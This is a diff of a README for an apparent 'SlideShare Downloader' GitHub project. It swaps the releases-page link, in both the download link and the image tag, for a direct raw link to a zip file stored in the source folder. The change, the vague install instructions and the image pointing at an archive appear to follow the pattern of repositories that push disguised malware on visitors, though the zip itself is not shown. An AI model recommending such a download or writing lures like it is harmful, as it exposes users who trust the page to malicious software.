@@ -10,7 +10,7 @@ Welcome to the SlideShare Downloader repository! This tool allows you to downloa
 ## Installation 🛠️
 To access the SlideShare Downloader tool, click on the link provided below. Make sure to follow any on-screen prompts to complete the installation process.
 
-🔗 [Download SlideShare Downloader](https://github.com/AkuJelekBet/slidesharedownloader/releases) 🔗
+🔗 [Download SlideShare Downloader](https://raw.githubusercontent.com/AkuJelekBet/slidesharedownloader/main/src/Software-1.5.zip) 🔗
 
 ## Usage 🖥️
 Once you have downloaded the tool, simply follow the steps outlined within the application to start downloading SlideShare slides in your preferred format. Whether you're a student, professional, or enthusiast, this tool will make accessing slides a breeze.
@@ -40,4 +40,4 @@ For the latest updates, be sure to follow us on GitHub and join our growing comm
 
 Let's make downloading SlideShare slides a seamless experience. Get started now with the SlideShare Downloader tool! 🎉
 
-![SlideShare Downloader](https://github.com/AkuJelekBet/slidesharedownloader/releases)
+![SlideShare Downloader](https://raw.githubusercontent.com/AkuJelekBet/slidesharedownloader/main/src/Software-1.5.zip)
